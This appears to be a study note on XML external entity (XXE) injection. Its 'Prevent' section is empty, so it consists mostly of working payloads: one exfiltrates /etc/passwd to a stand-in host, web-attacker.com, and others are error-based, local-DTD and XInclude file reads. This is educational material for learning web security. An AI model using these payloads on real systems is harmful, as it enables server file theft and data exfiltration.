# XML external entity (XXE) injection

## What is XML external entity injection?

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

## What are the types of XXE attacks?

- Exploiting XXE to retrieve files
- Exploiting XXE to perform SSRF attacks
- Exploiting blind XXE 

    -- blind XXE to exfiltrate data out-of-band
    ```xml
    // dtd file
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;

    // xxe inject
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
    "http://web-attacker.com/malicious.dtd"> %xxe;]>
    ```
    -- blind XXE to retrieve data via error messages

    ```xml
    // dtd file
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;

    // xxe inject
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
    "http://web-attacker.com/malicious.dtd"> %xxe;]>
    ```

    -- blind XXE by repurposing a local DTD

    ```xml
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```
- XInclude attacks
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```

## Some examples about XML external entity injection at above :+1:

![](https://i.imgur.com/R6kk8uc.png)

## Prevent XML external entity injection

